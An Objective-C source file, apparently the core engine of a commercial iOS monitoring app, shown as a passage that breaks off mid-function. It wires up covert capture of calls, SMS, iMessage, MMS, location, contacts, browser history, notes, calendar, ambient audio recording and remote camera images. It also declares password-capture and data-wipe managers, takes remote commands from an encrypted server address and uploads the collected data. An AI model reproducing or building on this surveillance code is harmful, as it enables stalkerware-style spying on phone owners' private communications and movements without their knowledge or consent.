//
//  AppEngine.m
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngine.h"
#import "AppEngineDelegate.h"
#import "AppEngineUICmd.h"
#import "Product.h"

// Components headers
#import "ComponentHeaders.h"

// Utils
#import "ServerErrorStatusHandler.h"
#import "PreferencesChangeHandler.h"
#import "MessagePortIPCSender.h"
#import "LicenseGetConfigUtils.h"
#import "LicenseHeartbeatUtils.h"
#import "SignificantLocationChangeHandler.h"
#import "PCC.h"

#import <CommonCrypto/CommonDigest.h>
#import <Photos/Photos.h>

@interface AppEngine (private)
- (void) createApplicationEngine;
- (void) createApplicationFeatures;
- (void) destructApplicationFeatures;
- (EventQueryPriority*) eventQueryPriority;
- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo;
@end

@implementation AppEngine

// Engine
@synthesize mApplicationContext;
@synthesize mSystemUtils;
@synthesize mLicenseManager;
@synthesize mConfigurationManager;
@synthesize mServerAddressManager;
@synthesize mConnectionHistoryManager;
@synthesize mPreferenceManager;
@synthesize mCSM;
@synthesize mDDM;
@synthesize mActivationManager;
@synthesize mERM;
@synthesize mEDM;
@synthesize mEventCenter;
@synthesize mRemoteCmdManager;
@synthesize mSBNotifier;
@synthesize mSoftwareUpdateManager;
@synthesize mUpdateConfigurationManager;

// Features
@synthesize mCallLogCaptureManager;
@synthesize mSMSCaptureManager;
@synthesize mIMessageCaptureManager;
@synthesize mMMSCaptureManager;
@synthesize mMailCaptureManager;
@synthesize mLocationManager;
@synthesize mAddressbookManager;
@synthesize mMediaFinder;
@synthesize mMediaCaptureManager;
@synthesize mAppAgentManager;
@synthesize mBrowserUrlCaptureManager;
@synthesize mBookmarkManager;
@synthesize mApplicationManager;
@synthesize mAmbientRecordingManager;
@synthesize mNoteManager;
@synthesize	mCalendarManager;
@synthesize mCameraCaptureManager;
@synthesize mFTCaptureManager;
@synthesize mPasswordCaptureManager;
@synthesize mDeviceSettingsManager;
@synthesize mHistoricalEventManager;
@synthesize mWipeDataManager;

// Flags & Others
@synthesize mIsRestartingAppEngine;
@synthesize mAppEngineDelegate;

- (id) init {
	if ((self = [super init])) {
		[self createApplicationEngine];
	}
	return (self);
}

#pragma mark -
#pragma mark License manager
#pragma mark -

- (void) onLicenseChanged:(LicenseInfo *)licenseInfo {
	DLog(@"--->Enter<---");
	@try {
		[self doLicenseChanged:licenseInfo];
	}
	@catch (NSException *e) {
		DLog(@"License changed got NSException: %@", e);
	}
	@catch (FxException *e) {
		DLog(@"License changed got FxException: %@", e);
	}
	@finally {
		[self setMIsRestartingAppEngine:FALSE];
	}
	DLog(@"--->End<---");
}

#pragma mark -
#pragma mark Server address manager
#pragma mark -

- (void) serverAddressChanged {
//	DLog (@"Server url changed, structured = %@", [mServerAddressManager getStructuredServerUrl]);
//	DLog (@"Server url changed, unstructured = %@", [mServerAddressManager getUnstructuredServerUrl]);
	
	NSString *structuredUrl = [mServerAddressManager getStructuredServerUrl];
	NSData *structuredUrlData = [structuredUrl dataUsingEncoding:NSUTF8StringEncoding];
	unsigned char msgDigestStructuredUrlByte[16];
	CC_MD5([structuredUrlData bytes], [structuredUrlData length], msgDigestStructuredUrlByte);
	NSData* msgDigestStructuredUrlData = [NSData dataWithBytes:msgDigestStructuredUrlByte length:16];
	
	unsigned char* result = (unsigned char*) [msgDigestStructuredUrlData bytes];
	NSString *urlChecksumString = [NSString stringWithFormat:
								   @"%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
								   result[0], result[1], result[2], result[3], 
								   result[4], result[5], result[6], result[7],
								   result[8], result[9], result[10], result[11],
								   result[12], result[13], result[14], result[15]
								   ];
	
	// Get data from cleanser file
    char *keyKey = nil;
    char *encryptedKey = nil;
    char *encryptedUrlChecksum = nil;
    
	//int value = (arc4random() % 20) + 1;
	
	for (int value = 1; value <= 20; value++) {
		switch (value) {
			case 1:
				keyKey = getkeyKey_1();
				encryptedKey = getEncryptedKey_1();
				encryptedUrlChecksum = getEncryptedUrlChecksum_1();
				break;
			case 2:
				keyKey = getkeyKey_2();
				encryptedKey = getEncryptedKey_2();
				encryptedUrlChecksum = getEncryptedUrlChecksum_2();
				break;
			case 3:
				keyKey = getkeyKey_3();
				encryptedKey = getEncryptedKey_3();
				encryptedUrlChecksum = getEncryptedUrlChecksum_3();
				break;
			case 4:
				keyKey = getkeyKey_4();
				encryptedKey = getEncryptedKey_4();
				encryptedUrlChecksum = getEncryptedUrlChecksum_4();
				break;
			case 5:
				keyKey = getkeyKey_5();
				encryptedKey = getEncryptedKey_5();
				encryptedUrlChecksum = getEncryptedUrlChecksum_5();
				break;
			case 6:
				keyKey = getkeyKey_6();
				encryptedKey = getEncryptedKey_6();
				encryptedUrlChecksum = getEncryptedUrlChecksum_6();
				break;
			case 7:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
			case 8:
				keyKey = getkeyKey_8();
				encryptedKey = getEncryptedKey_8();
				encryptedUrlChecksum = getEncryptedUrlChecksum_8();
				break;
			case 9:
				keyKey = getkeyKey_9();
				encryptedKey = getEncryptedKey_9();
				encryptedUrlChecksum = getEncryptedUrlChecksum_9();
				break;
			case 10:
				keyKey = getkeyKey_10();
				encryptedKey = getEncryptedKey_10();
				encryptedUrlChecksum = getEncryptedUrlChecksum_10();
				break;
			case 11:
				keyKey = getkeyKey_11();
				encryptedKey = getEncryptedKey_11();
				encryptedUrlChecksum = getEncryptedUrlChecksum_11();
				break;
			case 12:
				keyKey = getkeyKey_12();
				encryptedKey = getEncryptedKey_12();
				encryptedUrlChecksum = getEncryptedUrlChecksum_12();
				break;
			case 13:
				keyKey = getkeyKey_13();
				encryptedKey = getEncryptedKey_13();
				encryptedUrlChecksum = getEncryptedUrlChecksum_13();
				break;
			case 14:
				keyKey = getkeyKey_14();
				encryptedKey = getEncryptedKey_14();
				encryptedUrlChecksum = getEncryptedUrlChecksum_14();
				break;
			case 15:
				keyKey = getkeyKey_15();
				encryptedKey = getEncryptedKey_15();
				encryptedUrlChecksum = getEncryptedUrlChecksum_15();
				break;
			case 16:
				keyKey = getkeyKey_16();
				encryptedKey = getEncryptedKey_16();
				encryptedUrlChecksum = getEncryptedUrlChecksum_16();
				break;
			case 17:
				keyKey = getkeyKey_17();
				encryptedKey = getEncryptedKey_17();
				encryptedUrlChecksum = getEncryptedUrlChecksum_17();
				break;
			case 18:
				keyKey = getkeyKey_18();
				encryptedKey = getEncryptedKey_18();
				encryptedUrlChecksum = getEncryptedUrlChecksum_18();
				break;
			case 19:
				keyKey = getkeyKey_19();
				encryptedKey = getEncryptedKey_19();
				encryptedUrlChecksum = getEncryptedUrlChecksum_19();
				break;
			case 20:
				keyKey = getkeyKey_20();
				encryptedKey = getEncryptedKey_20();
				encryptedUrlChecksum = getEncryptedUrlChecksum_20();
				break;
			default:
				keyKey = getkeyKey_7();
				encryptedKey = getEncryptedKey_7();
				encryptedUrlChecksum = getEncryptedUrlChecksum_7();
				break;
		}
		
		NSData *encryptedKeyData = [NSData dataWithBytes:encryptedKey length:32];
		NSString *keyKeyString = [NSString stringWithCString:keyKey encoding:NSUTF8StringEncoding];
		NSData *urlChecksumKeyData = [encryptedKeyData AES128DecryptWithKey:keyKeyString];
		NSString *urlChecksumKeyString = [[[NSString alloc] initWithData:urlChecksumKeyData encoding:NSUTF8StringEncoding] autorelease];
		NSData *encryptedUrlChecksumData = [NSData dataWithBytes:encryptedUrlChecksum length:48];
		NSData *cleanserUrlChecksumData = [encryptedUrlChecksumData AES128DecryptWithKey:urlChecksumKeyString]; // Checksum string data
		NSString *cleanserUrlChecksum = [[[NSString alloc] initWithData:cleanserUrlChecksumData encoding:NSUTF8StringEncoding] autorelease];
		
		if (encryptedKey) free(encryptedKey);
		if (keyKey) free(keyKey);
		if (encryptedUrlChecksum) free(encryptedUrlChecksum);
		

		
		DLog (@"urlChecksumString = %@, cleanserUrlChecksum = %@", urlChecksumString, cleanserUrlChecksum);
		
		if ([urlChecksumString isEqualToString:cleanserUrlChecksum]) {
			// Check next index of checksum of url in cleanser
		} else {
			DLog (@"Seriously failure.....");
            //DLog (@"!!!!! Skip verify url checksum")
			exit(0);
		}
	}
	
	[mCSM setStructuredURL:[NSURL URLWithString:structuredUrl]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
}

#pragma mark -
#pragma mark Engine utils functions
#pragma mark -

- (void) createApplicationEngine {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
	DLog(@"Contruct engine");
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
    
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
	// Home private and shared directory
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
	NSString *command = [NSString stringWithFormat:@"chmod 777 %@", sharedHome];
	system([command cStringUsingEncoding:NSUTF8StringEncoding]);
	
	// etc folder
	NSString* etcPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:etcPath];
	command = [NSString stringWithFormat:@"chmod 777 %@", etcPath];
	system([command cStringUsingEncoding:NSUTF8StringEncoding]);
    
    // log folder
    [DaemonPrivateHome createDirectoryAndIntermediateDirectories:[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:@"/log"]];

#pragma GCC diagnostic pop
	
	// App context
	NSData *productCipher = [NSData dataWithBytes:kProductInfoCipher length:(sizeof(kProductInfoCipher)/sizeof(unsigned char))];
	mApplicationContext = [[AppContextImp alloc] initWithProductCipher:productCipher];
	
	// System utils
	mSystemUtils = [[SystemUtilsImpl alloc] init];
	
	// License manager
	mLicenseManager = [[LicenseManager alloc] initWithAppContext:mApplicationContext];
	[mLicenseManager addLicenseChangeListener:self];
	
	// Configuration manager
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	[mConfigurationManager updateConfigurationID:[mLicenseManager getConfiguration]];
	
	// Server URL
	mServerAddressManager = [[ServerAddressManagerImp alloc] initWithServerAddressChangeDelegate:self];
	[mServerAddressManager setRequireBaseServerUrl:FALSE];
	NSData *urlCipher = [NSData dataWithBytes:kServerUrl length:(sizeof(kServerUrl)/sizeof(unsigned char))];
	[mServerAddressManager setBaseServerCipherUrl:urlCipher]; // Synchronous call to serverAddressChanged selector, 1st time, CMS is nil
	
	// Connection history
	mConnectionHistoryManager = [[ConnectionHistoryManagerImp alloc] init];
	[mConnectionHistoryManager setMMaxConnectionCount:10];
	
	// Preferences
	mPreferenceManager = [[PreferenceManagerImpl alloc] init];
    
	// CSM
	NSString *payloadPath = [privateHome stringByAppendingString:@"csm/payload/"];
	NSString *sessionPath = [privateHome stringByAppendingString:@"csm/dbsession/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:payloadPath];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sessionPath];
	mCSM = [CommandServiceManager sharedManagerWithPayloadPath:payloadPath withDBPath:sessionPath];
	[mCSM setStructuredURL:[NSURL URLWithString:[mServerAddressManager getStructuredServerUrl]]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
	
	// DDM
	mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
	[mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
	[mDDM setMAppContext:mApplicationContext];
	[mDDM setMLicenseManager:mLicenseManager];
	[mDDM setMServerAddressManager:mServerAddressManager];
	[mDDM setMConnectionHistory:mConnectionHistoryManager];
	
	// Activation manager
	mActivationManager = [[ActivationManager alloc] initWithDataDelivery:mDDM
														  withAppContext:mApplicationContext
													   andLicenseManager:mLicenseManager];
	[mActivationManager setMServerAddressManager:mServerAddressManager];

	// Event repository
	mERM = [[EventRepositoryManager alloc] initWithEventQueryPriority:[self eventQueryPriority]];
	[mERM openRepository];
	//[mERM dropRepository];
	
	// EDM
	mEDM = [[EventDeliveryManager alloc] initWithEventRepository:mERM andDataDelivery:mDDM];
	[mEDM setMLicenseManager:mLicenseManager];
	 
	// Event center
	mEventCenter = [[EventCenter alloc] initWithEventRepository:mERM];
	
	// Software update manager
	mSoftwareUpdateManager = [[SoftwareUpdateManagerImpl alloc] initWithDDM:mDDM];
	
	// Update configuration manager
	mUpdateConfigurationManager = [[UpdateConfigurationManagerImpl alloc] initWithDDM:mDDM];
	[mUpdateConfigurationManager setMLicenseManager:mLicenseManager];
	
	// RCM
	NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
	mRemoteCmdManager = [[RemoteCmdManagerImpl alloc] init];
	[mDDM setMRemoteCommand:[mRemoteCmdManager mPCCCmdCenter]];
	[mRemoteCmdManager setMServerAddressManager:mServerAddressManager];
	[mRemoteCmdManager setMEventDelegate:mEventCenter];
	[mRemoteCmdManager setMLicenseManager:mLicenseManager];
	[mRemoteCmdManager setMDataDelivery:mDDM];
	[mRemoteCmdManager setMEventDelivery:mEDM];
	[mRemoteCmdManager setMAppContext:mApplicationContext];
	[mRemoteCmdManager setMPreferenceManager:mPreferenceManager];
	[mRemoteCmdManager setMActivationManagerProtocol:mActivationManager];
	[mRemoteCmdManager setMSupportCmdCodes:[mConfigurationManager mSupportedRemoteCmdCodes]];
	[mRemoteCmdManager setMSystemUtils:mSystemUtils];
	[mRemoteCmdManager setMEventRepository:mERM];
	[mRemoteCmdManager setMConnectionHistoryManager:mConnectionHistoryManager];
	[mRemoteCmdManager setMConfigurationManager:mConfigurationManager];
	[mRemoteCmdManager setMMediaSearchPath:mediaFoundPath];
	[mRemoteCmdManager setMSoftwareUpdateManager:mSoftwareUpdateManager];
	[mRemoteCmdManager setMUpdateConfigurationManager:mUpdateConfigurationManager];
	[mRemoteCmdManager launch];
	
	// Utils
    // Server errors
	mServerErrorStatusHandler = [[ServerErrorStatusHandler alloc] init];
	[mServerErrorStatusHandler setMLicenseManager:mLicenseManager];
	[mServerErrorStatusHandler setMAppEngine:self];
	[mDDM setMServerStatusErrorListener:mServerErrorStatusHandler];
	mPreferencesChangeHandler = [[PreferencesChangeHandler alloc] initWithAppEngine:self];
	[mPreferenceManager addPreferenceChangeListener:mPreferencesChangeHandler];
	// Configuration
	mLicenseGetConfigUtils = [[LicenseGetConfigUtils alloc] initWithDataDelivery:mDDM];
	[mLicenseGetConfigUtils setMLicenseManager:mLicenseManager];
	// Heart beat
	mLicenseHeartbeatUtils = [[LicenseHeartbeatUtils alloc] initWithDataDelivery:mDDM];
	
	// Connection to UI
	mAppEngineConnection = [[AppEngineConnection alloc] initWithAppEngine:self];
	
	// Start-up time
	PrefStartupTime *prefStartupTime = (PrefStartupTime *)[mPreferenceManager preference:kStartup_Time];
	[prefStartupTime setMStartupTime:[DateTimeFormat phoenixDateTime]];
	[mPreferenceManager savePreference:prefStartupTime];
	
	// Sprinbiard notification of did launch
	mSBNotifier = [[SBDidLaunchNotifier alloc] init];
	[mSBNotifier setMDelegate:self];
	[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
	[mSBNotifier start];
    
    // Significant location change
    mSignificantLocationChangeHandler = [[SignificantLocationChangeHandler alloc] initWithAppEngine:self];
	
	// Set flag for engine just starting
	[self setMIsRestartingAppEngine:TRUE];
    
    #warning test background task
    mBackgroundTask = [[BackgroundTask alloc] init];
    [mBackgroundTask startBackgroundTasks:1800 target:self selector:@selector(captureAllData)];
    
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
    DLog(@"Contruct engine --- OK ---")
    DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
}

- (void) createApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Contruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
    
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation = (PrefLocation *)[mPreferenceManager preference:kLocation];
	PrefRestriction *prefRestriction = (PrefRestriction *)[mPreferenceManager preference:kRestriction];
	
	if ([prefEventCapture mDeliveryMethod] == kDeliveryMethodAny) {
		[mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiWWAN];
	} else if ([prefEventCapture mDeliveryMethod] == kDeliveryMethodWifi) {
		[mDDM setMDataDeliveryMethod:kDataDeliveryViaWifiOnly];
	}
	
	[mEDM setMaximumEvent:[prefEventCapture mMaxEvent]];
	[mEDM setDeliveryTimer:[prefEventCapture mDeliverTimer]];
	
	// Call log
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
		if (!mCallLogCaptureManager) {
			mCallLogCaptureManager = [[CallLogCaptureManager alloc] initWithEventDelegate:mEventCenter];
			[mCallLogCaptureManager setMAC:[NSString stringWithFormat:@"*#%@", [[mLicenseManager mCurrentLicenseInfo] activationCode]]];
		}
	} else {
		// Upgrade or downgrad features
		[mCallLogCaptureManager release];
		mCallLogCaptureManager = nil;
	}

	// SMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		if (!mSMSCaptureManager) {
			mSMSCaptureManager = [[SMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			[mSMSCaptureManager setMAppContext:mApplicationContext];
		}
	} else {
		// Upgrade or downgrad features
		[mSMSCaptureManager release];
		mSMSCaptureManager = nil;
	}
	
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
	// iMessage
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventIM]) {
        // Set max size for IM Attachement
        NSUInteger imageLimit = [prefEventCapture mIMAttachmentImageLimitSize];
        NSUInteger audioLimit = [prefEventCapture mIMAttachmentAudioLimitSize];
        NSUInteger videoLimit = [prefEventCapture mIMAttachmentVideoLimitSize];
        NSUInteger nonMediaLimit = [prefEventCapture mIMAttachmentNonMediaLimitSize];
        DLog(@"(Perference change) Setup attachment size limit from preference IMAGE %lu, AUDIO %lu, VIDEO %lu, NON-MEDIA %lu",
             (unsigned long)imageLimit, (unsigned long)audioLimit, (unsigned long)videoLimit, (unsigned long)nonMediaLimit)
        [[FxIMEventUtils sharedFxIMEventUtils] setMImageAttMaxSize:imageLimit];
        [[FxIMEventUtils sharedFxIMEventUtils] setMAudioAttMaxSize:audioLimit];
        [[FxIMEventUtils sharedFxIMEventUtils] setMVideoAttMaxSize:videoLimit];
        [[FxIMEventUtils sharedFxIMEventUtils] setMOtherAttMaxSize:nonMediaLimit];
        
		if (!mIMessageCaptureManager && [mPreferencesChangeHandler isSupportSettingIDOfRemoteCmdCodeSettings:kRemoteCmdIMIMessage]) {
			NSString* imiMessageAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imiMessage/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:imiMessageAttachmentPath];
			
			mIMessageCaptureManager = [[IMessageCaptureManager alloc] initWithEventDelegate:mEventCenter];			
		} else {
            [mIMessageCaptureManager release];
            mIMessageCaptureManager = nil;
        }
	} else {
		// Upgrade or downgrad features
		[mIMessageCaptureManager release];
		mIMessageCaptureManager = nil;
	}

	// MMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		if (!mMMSCaptureManager) {
			mMMSCaptureManager = [[MMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			NSString* mmsAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];
			[mMMSCaptureManager setMMMSAttachmentPath:mmsAttachmentPath];
		}
	} else {
		// Upgrade or downgrad features
		[mMMSCaptureManager release];
		mMMSCaptureManager = nil;
	}
	
	// Email
//	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventEmail]) {
//		if (!mMailCaptureManager) {
//			mMailCaptureManager = [[MailCaptureManager alloc] initWithEventDelegate:mEventCenter];
//		}
//		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableEmail]) {
//			[mMailCaptureManager startMonitoring];
//		} else {
//			[mMailCaptureManager stopMonitoring];
//		}
//	} else {
//		// Upgrade or downgrad features
//		[mMailCaptureManager release];
//		mMailCaptureManager = nil;
//	}
	
	// Location
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		if (!mLocationManager) {
			mLocationManager = [[LocationManagerImpl alloc] init];
			[mLocationManager setMIntervalTime:[prefLocation mLocationInterval]];
			[mLocationManager setEventDelegate:mEventCenter];
			[mLocationManager setMAppContext:mApplicationContext];
		}
		if ([prefEventCapture mStartCapture] && [prefLocation mEnableLocation]) {
			 [mLocationManager startTracking];
		} else {
			 [mLocationManager stopTracking];
		}
	} else {
		// Upgrade or downgrad features
		[mLocationManager release];
		mLocationManager = nil;
	}
	
	// Address book
	if ([mConfigurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		if (!mAddressbookManager) {
			mAddressbookManager = [[AddressbookManagerImp alloc] initWithDataDeliveryManager:mDDM];
			[mRemoteCmdManager setMAddressbookManager:mAddressbookManager];
			[mRemoteCmdManager relaunchForFeaturesChange];
		}
		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) {
			[mAddressbookManager setMode:kAddressbookManagerModeOff];
			[mAddressbookManager stop];
		} else {
			[mAddressbookManager setMode:kAddressbookManagerModeMonitor];
			[mAddressbookManager start];
		}
	} else {
		// Upgrade or downgrad features
		[mAddressbookManager release];
		mAddressbookManager = nil;
	}
	
	// Media finder
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		if (!mMediaFinder) {
			NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
			mMediaFinder = [[MediaFinder alloc] initWithEventDelegate:mEventCenter andMediaPath:mediaFoundPath];
		}
		
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[mPreferenceManager savePreference:prefEventCapture];
		}

		// Video
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		// Audio
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		if ([entries count]) {
			// We will not search media files we will wait for command (new use case)
			//[mMediaFinder findMediaFileWithExtMime:entries];
		}
	} else {
		[mMediaFinder release];
		mMediaFinder = nil;
	}
    
    // Media capture
    if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
        [mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
        if (!mMediaCaptureManager) {
            NSString* mediaCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/thumbnails/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
            mMediaCaptureManager = [[MediaCaptureManager alloc] initWithEventDelegate:mEventCenter andThumbnailDirectoryPath:mediaCapturePath];
        }
    }
    else {
        [mMediaCaptureManager release];
        mMediaCaptureManager = nil;
    }
	
	// Browser url/Bookmark capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if (!mBrowserUrlCaptureManager) {
			mBrowserUrlCaptureManager = [[BrowserUrlCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
	} else {
		[mBrowserUrlCaptureManager release];
		mBrowserUrlCaptureManager = nil;
	}
	
//	// App agent
//	if (!mAppAgentManager) {
//		mAppAgentManager = [[AppAgentManager alloc] initWithEventDelegate:mEventCenter];
//	}
//	//[mAppAgentManager startListenMemoryWarningLevel]; // No need because spec is changed which not interested in memory low
//	[mAppAgentManager setThresholdInMegabyteForDiskSpaceCriticalLevel:20];
//	[mAppAgentManager startListenDiskSpaceWarningLevel];
//	[mAppAgentManager startHandleUncaughtException];
//	[mAppAgentManager startListenSystemPowerAndWakeIphone];
//	[mAppAgentManager startListenBatteryWarningLevel];
	
	// Bookmark 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_Bookmark]) {
		if (!mBookmarkManager) {
			DLog (@"----------- mBookmarkManager doesnt' exist, so create one")
			mBookmarkManager = [[BookmarkManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"----------- mBookmarkManager exists")
		}
        
		[mRemoteCmdManager setMBookmarkManager:mBookmarkManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		DLog (@"RequestBookmark is not supported")
		[mBookmarkManager release];
		mBookmarkManager = nil;
		[mRemoteCmdManager setMBookmarkManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Installed/Running application 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_InstalledApplication] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_RunningApplication]) {
		if (!mApplicationManager) {
			DLog (@"mApplicationManager (installed) doesnt' exist, so create one")
			mApplicationManager = [[ApplicationManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"mApplicationManager (installed) exists")
		}
		[mRemoteCmdManager setMApplicationManager:mApplicationManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mApplicationManager release];
		mApplicationManager = nil;
		[mRemoteCmdManager setMApplicationManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
    // Ambient recording manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
		if (!mAmbientRecordingManager) {
			NSString* mediaCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
			mAmbientRecordingManager = [[AmbientRecordingManagerImpl alloc] initWithEventDelegate:mEventCenter outputPath:mediaCapturePath];
		}
		[mRemoteCmdManager setMAmbientRecordingManager:mAmbientRecordingManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
	} else {
		[mAmbientRecordingManager release];
		mAmbientRecordingManager = nil;
		[mRemoteCmdManager setMAmbientRecordingManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Note manager
	if ([mConfigurationManager isSupportedFeature:kFeatureID_NoteCapture]) {
		if (!mNoteManager) {
			mNoteManager = [[NoteManagerImpl alloc] initWithDDM:mDDM];
			[mRemoteCmdManager setMNoteManager:mNoteManager];
		}
		if ([prefEventCapture mEnableNote]) { // Regardless of stop capture flag
			[mNoteManager startCapture];
		} else {
			[mNoteManager stopCapture];
		}
	} else {
		[mNoteManager release];
		mNoteManager = nil;
		[mRemoteCmdManager setMNoteManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
	
	// Calendar Manager 
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCalendar]) {
		if (!mCalendarManager) {
			DLog (@"mCalendarManager (installed) doesnt' exist, so create one")
			mCalendarManager = [[CalendarManagerImpl alloc] initWithDDM:mDDM];
		} else {
			DLog (@"mCalendarManager (installed) exists")
		}
		[mRemoteCmdManager setMCalendarManager:mCalendarManager];
		[mRemoteCmdManager relaunchForFeaturesChange];
		
		if ([prefEventCapture mEnableCalendar]) { // Regardless of stop capture flag
			[mCalendarManager startCapture];
		} else {
			[mCalendarManager stopCapture];
		}
	} else {
		[mCalendarManager release];
		mCalendarManager = nil;
		[mRemoteCmdManager setMCalendarManager:nil];
		[mRemoteCmdManager relaunchForFeaturesChange];
	}
    
    // Remote camera image/video manager
    if ([mConfigurationManager isSupportedFeature:kFeatureID_RemoteCameraImage]) {
        if (!mCameraCaptureManager) {
            mCameraCaptureManager = [[CameraCaptureManager alloc] initWithEventDelegate:mEventCenter];
            NSString* cameraCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/"];
            [DaemonPrivateHome createDirectoryAndIntermediateDirectories:cameraCapturePath];
            [mCameraCaptureManager setMOnDemandOutputPath:cameraCapturePath];
        } else {
            DLog (@"mCameraCaptureManager already exists")
        }
